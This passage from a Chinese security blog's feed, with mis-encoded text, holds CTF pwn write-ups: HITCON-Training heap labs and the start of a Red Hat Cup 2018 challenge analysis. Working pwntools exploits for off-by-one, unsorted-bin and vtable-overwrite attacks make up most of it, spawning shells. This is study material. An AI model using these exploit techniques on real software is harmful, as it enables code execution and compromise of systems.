class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœ¬é¢˜éœ€è¦åˆ©ç”¨<code>Extend the chunk</code>ï¼Œåˆ©ç”¨å‰ææ˜¯å­˜åœ¨å¯æ§çš„off-by-oneï¼Œåˆ›é€ å‡ºoverlap chunkï¼Œè¿›è€Œæ›´æ”¹å…¶ä»–chunkä¸­çš„å†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"0000"</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"1111"</span>) <span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span>*<span class="number">0x18</span> + <span class="string">"\x41"</span>) <span class="comment"># off by one</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># overlap chunk</span></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">'atoi'</span>])) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>) <span class="comment"># leak libc.address</span></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.sym[<span class="string">"atoi"</span>]</span><br><span class="line">success(<span class="string">"libc.address -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab14-magicheap"><a href="#lab14-magicheap" class="headerlink" title="lab14-magicheap"></a>lab14-magicheap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab14/magicheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>unsorted bin attackåŸç†ï¼šå †åœ¨åˆ†é…çš„æ—¶å€™ï¼Œå¦‚æœåœ¨ç”³è¯·çš„å†…å­˜å¤§å°æ‰€å¯¹åº”çš„small binæˆ–è€…large biné‡Œé¢æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„chunkï¼Œæ­¤æ—¶ä¼šä»unsorted biné‡Œé¢å»å¯»æ‰¾chunkçœ‹æ˜¯å¦å­˜åœ¨åˆé€‚çš„å†…å­˜åˆ†é…ç»™ç”¨æˆ·ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šæŠŠunsorted biné“¾è¡¨ç»™æ¸…ç©ºï¼Œæ¸…ç©ºçš„è¿‡ç¨‹ä¸­æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œç”±æ­¤å¯èƒ½ä¼šå‘ç”Ÿä»»æ„åœ°å€å¯å†™ã€‚æºä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></p><p>å¦‚æœbckçš„fdå¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è®©å®ƒæŒ‡å‘ä»»æ„åœ°å€ï¼Œæœ€ç»ˆä½¿<code>*(bck-&gt;fd)+0x10</code>çš„å€¼è¢«ä¿®æ”¹æˆ<code>unsorted_chunks(av)</code>(ä¸€èˆ¬æ¥è¯´æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ­£æ•°ï¼Œæ— æ³•æ§åˆ¶)ã€‚å¸¸è§å¥—è·¯æ˜¯ä¿®æ”¹<code>global_max_fast</code>å…¨å±€å˜é‡ï¼Œè¿™ä¸ªå˜é‡ç”¨äºæ§åˆ¶æœ€å¤§çš„Fast chunkçš„å¤§å°ï¼Œå°±èƒ½ä½¿ä¹‹åçš„chunkéƒ½è¢«å½“ä½œfast chunkï¼Œå³å¯è¿›è¡ŒFast bin attack</p><p>å‚è€ƒä»£ç <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c</a></p><p>æ¼æ´åœ¨<code>edit</code>å‡½æ•°ï¼Œç¼–è¾‘çš„æ—¶å€™ä»»æ„æŒ‡å®šé•¿åº¦ï¼Œæœ¬é¢˜åªéœ€è¦ä¿®æ”¹<code>magic</code>çš„å€¼å³å¯<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( heaparray[v2] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size of Heap : "</span>, &amp;buf);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">  v0 = atoi(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">  read_input(heaparray[v2], v0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./magicheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./magicheap"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content, attack = False)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">" : "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">" :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400C8C\nc\n'</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'cccc'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(elf.sym[<span class="string">"magic"</span>] - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x10</span> + <span class="number">0x20</span>, payload)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'dddd'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">"4869"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab15-zoo"><a href="#lab15-zoo" class="headerlink" title="lab15-zoo"></a>lab15-zoo</h3><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://github.com/0x01f/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf" target="_blank" rel="noopener">https://github.com/0x01f/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab15/zoo&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p><p>æ¼æ´ç‚¹åœ¨<code>strcpy</code>ï¼Œæ²¡æœ‰é™åˆ¶é•¿åº¦ï¼Œå¯ä»¥è¦†ç›–å…¶ä»–chunkï¼š<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> :</span> <span class="keyword">public</span> Animal&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">Dog(<span class="built_in">string</span> str,<span class="keyword">int</span> w)&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(name,str.c_str());</span><br><span class="line">weight = w ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Wow ~ Wow ~ Wow ~"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">                ...</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>ç¨‹åºæ²¡æœ‰å¼€nxï¼Œå¯ä»¥åœ¨<code>nameofzoo</code>é‡Œé¢æ”¾shellcodeï¼Œè¦†ç›–vtableçš„æŒ‡é’ˆå³å¯ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'DEBUG'</span>) </span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">p = process(<span class="string">'./zoo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_dog</span><span class="params">(name,weight)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(weight))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_ani</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"5"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listen</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40193E\nc\n")</span></span><br><span class="line">nameofzoo = <span class="number">0x605420</span></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, sc + p64(nameofzoo))</span><br><span class="line">add_dog(<span class="string">"a"</span>*<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">add_dog(<span class="string">"b"</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">remove_ani(<span class="number">0</span>)</span><br><span class="line">fake_vptr = nameofzoo + len(sc)</span><br><span class="line">add_dog(<span class="string">"c"</span>*<span class="number">72</span> + p64(fake_vptr),<span class="number">2</span>)</span><br><span class="line">listen(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Outline&quot;&gt;&lt;a href=&quot;#Outline&quot; class=&quot;headerlink&quot; title=&quot;Outline&quot;&gt;&lt;/a&gt;Outline&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Basic Knowledge&lt;ul&gt;
&lt;li&gt;Introduction&lt;ul&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>çº¢å¸½æ¯2018çº¿ä¸‹èµ›AWD PWN(æ›´æ–°æ ¼å¼åŒ–å­—ç¬¦åˆ©ç”¨)</title>
    <link href="https://4f-kira.github.io/2018/06/01/redhat2018-awd-pwn/"/>
    <id>https://4f-kira.github.io/2018/06/01/redhat2018-awd-pwn/</id>
    <published>2018-06-01T03:20:07.000Z</published>
    <updated>2018-06-05T05:29:07.641Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¹´çº¢å¸½æ¯ç»™webé¢˜æ¶å¿ƒåˆ°äº†ï¼Œåˆšå¤‡ä»½çš„ä»£ç å·²ç»æœ‰æŸå›½ä¼çš„3ä¸ªä¸æ­»é©¬ï¼Œä¸çŸ¥é“å¦‚ä½•åšåˆ°è¿™ä¹ˆå¿«çš„ï¼Œé¢˜ç›®è´¨é‡ä¹Ÿå ªå¿§ï¼Œè·Ÿå»å¹´çš„æ²¡æ³•æ¯”ã€‚æ¯”èµ›è¿‡ç¨‹èŠ±å¤ªå¤šæ—¶é—´åœ¨webï¼Œéƒ½æ²¡å¥½å¥½çœ‹çœ‹pwnï¼Œå…¶å®å¾ˆç®€å•ï¼Œè¡€äºT_Tâ€¦.</p><h3 id="ä¿æŠ¤æƒ…å†µ"><a href="#ä¿æŠ¤æƒ…å†µ" class="headerlink" title="ä¿æŠ¤æƒ…å†µ"></a>ä¿æŠ¤æƒ…å†µ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  sub_CC2();                                    <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[HFS V0.0.1]"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt;"</span>, a2);</span><br><span class="line">    a2 = (<span class="keyword">char</span> **)(&amp;dword_30 + <span class="number">2</span>);</span><br><span class="line">    get_str(s2, <span class="number">50</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = (<span class="keyword">char</span> **)s2;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)qword_202100[i], s2) ) <span class="comment">//ä¸‹æ–­ç‚¹</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        ls();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        touch();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"bye!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        rm();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        su();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        sh();                                   </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(s2, a2);                         <span class="comment">// æ ¼å¼åŒ–å­—ç¬¦</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" :command not found!"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹æ ·å­æ˜¯ä¸€ä¸ªè‡ªå·±å®ç°çš„shellï¼Œè‡³äºæœ‰å“ªäº›å‘½ä»¤ï¼Œå¯ä»¥ä¸‹ä¸ªæ–­ç‚¹å»çœ‹çœ‹ï¼Œå‘ç°åªæœ‰<code>ls touch rm su sh exit</code>6ä¸ªå‘½ä»¤ã€‚</p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>ç¨‹åºæœ¬æ¥æ˜¯å¼€å¯äº†NXï¼Œä¸è¿‡ç•™æ„ä¸€ä¸‹åˆå§‹åŒ–çš„å‡½æ•°ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">    qword_202100[i] = (__int64)<span class="built_in">malloc</span>(<span class="number">0x14</span>uLL);</span><br><span class="line">  v0 = qword_202100[<span class="number">0</span>];</span><br><span class="line">  *(_WORD *)qword_202100[0] = 'sl';</span><br><span class="line">  *(_BYTE *)(v0 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v1 = qword_202108;</span><br><span class="line">  *(_DWORD *)qword_202108 = 'cuot';</span><br><span class="line">  *(_WORD *)(v1 + <span class="number">4</span>) = <span class="number">104</span>;</span><br><span class="line">  v2 = qword_202110;</span><br><span class="line">  *(_DWORD *)qword_202110 = 'tixe';</span><br><span class="line">  *(_BYTE *)(v2 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  v3 = qword_202118;</span><br><span class="line">  *(_WORD *)qword_202118 = 'mr';</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v4 = qword_202120;</span><br><span class="line">  *(_WORD *)qword_202120 = 'us';</span><br><span class="line">  *(_BYTE *)(v4 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v5 = qword_202128;</span><br><span class="line">  *(_WORD *)qword_202128 = 'hs';</span><br><span class="line">  *(_BYTE *)(v5 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v6 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v6);</span><br><span class="line">  v7 = rand();</span><br><span class="line">  src = (<span class="keyword">char</span> *)mmap(</span><br><span class="line">                  (<span class="keyword">void</span> *)(((v7 + <span class="number">16</span>) &lt;&lt; <span class="number">12</span>) + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v7 + <span class="number">16</span>) &lt;&lt; <span class="number">12</span>) &gt;= <span class="number">0xFFFFFFFF</span>)),</span><br><span class="line">                  <span class="number">0x1000</span>uLL,</span><br><span class="line">                  <span class="number">7</span>,</span><br><span class="line">                  <span class="number">50</span>,</span><br><span class="line">                  <span class="number">-1</span>,</span><br><span class="line">                  <span class="number">0L</span>L);</span><br><span class="line">  v8 = src;</span><br><span class="line">  *(_QWORD *)src = '$4ï¿½\x01\v eh';</span><br><span class="line">  *((_QWORD *)v8 + 1) = 'noï¿½H\x01\x01\x01\x01';</span><br><span class="line">  *((_QWORD *)v8 + 2) = 'HPeineD ';</span><br><span class="line">  *((_QWORD *)v8 + 3) = 'ssimrePï¿½';</span><br><span class="line">  *((_QWORD *)v8 + 4) = '_\x01jX\x01jPi';</span><br><span class="line">  *((_QWORD *)v8 + 5) = '\x05\x0Fï¿½ï¿½HZ\x13j';</span><br><span class="line">  *((_WORD *)v8 + 24) = 'ï¿½ï¿½';</span><br><span class="line">  v8[<span class="number">50</span>] = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥ç•™æ„åˆ°ç¨‹åºåˆå§‹åŒ–äº†å‡ ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”å°†srcçš„å†…å­˜æ®µmmapäº†ï¼Œé‚£ä¹ˆsrcå¯ä»¥æ‰§è¡Œshellcodeã€‚ç„¶åè½¬åˆ°<code>su()</code>çœ‹çœ‹<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dest = s2;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span 